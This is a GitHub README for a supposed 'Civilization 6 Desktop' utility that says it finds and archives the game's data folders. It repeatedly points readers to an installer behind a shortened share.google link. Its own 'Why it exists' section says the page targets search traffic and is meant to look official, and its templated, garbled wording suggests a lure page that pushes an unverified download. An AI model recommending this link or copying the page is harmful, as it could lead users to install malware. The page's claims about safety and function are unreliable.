![Civilization 6 Desktop](assets/hero.png)

# Civilization 6 Desktop

*Find the Civilization 6 folder fast and keep a local spare.*

## Overview

**Civilization 6 Desktop** is a Windows utility. Local Windows and macOS helper for Civilization 6 data paths, config and export caches, and export folders.

Patches move Civilization 6 data paths without warning.

It runs on the local PC. No account, and nothing is uploaded.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Locates Civilization 6 user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Why it exists

Search traffic for Civilization 6 is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/r-jimenez-3204/civilization-6-desktop

MIT license. See `LICENSE`.
